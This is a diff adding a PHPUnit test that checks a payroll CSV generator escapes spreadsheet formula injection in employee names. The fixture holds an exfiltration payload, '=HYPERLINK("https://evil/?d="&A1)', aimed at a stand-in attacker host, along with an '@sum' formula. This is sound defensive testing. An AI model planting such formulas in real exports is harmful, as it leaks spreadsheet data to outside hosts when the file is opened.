@@ -136,4 +136,34 @@ class SocialDeclarationGeneratorTest extends TestCase
         self::assertStringContainsString("S44.G00.00.002,'2'\r\n", $content);
         self::assertStringContainsString("S44.G00.00.003,'3250.25'\r\n", $content);
     }
+
+    public function test_cnas_dz_neutralizes_csv_formula_injection_in_names(): void
+    {
+        // Audit #6556 — un nom commençant par = / + / - / @ devient une
+        // formule Excel à l'ouverture : le préfixe ' doit être ajouté.
+        $generator = new SocialDeclarationGenerator;
+
+        $content = $generator->generateCnasDz(
+            'Leo RH',
+            'NIS123',
+            'Q2',
+            2026,
+            new Collection([
+                [
+                    'employee_id' => 1,
+                    'num_ss' => 'SS001',
+                    'last_name' => '=HYPERLINK("https://evil/?d="&A1)',
+                    'first_name' => '@sum(A1:A9)',
+                    'date_naissance' => '1990-01-05',
+                    'gross_salary' => 100000.0,
+                    'months_worked' => 3,
+                ],
+            ]),
+        );
+
+        self::assertStringContainsString("'=HYPERLINK", $content);
+        self::assertStringContainsString("'@SUM", $content);
+        // la ligne reste structurellement intacte (4 colonnes après LIGNE)
+        self::assertStringContainsString('LIGNE|000001|SS001|', $content);
+    }
 }
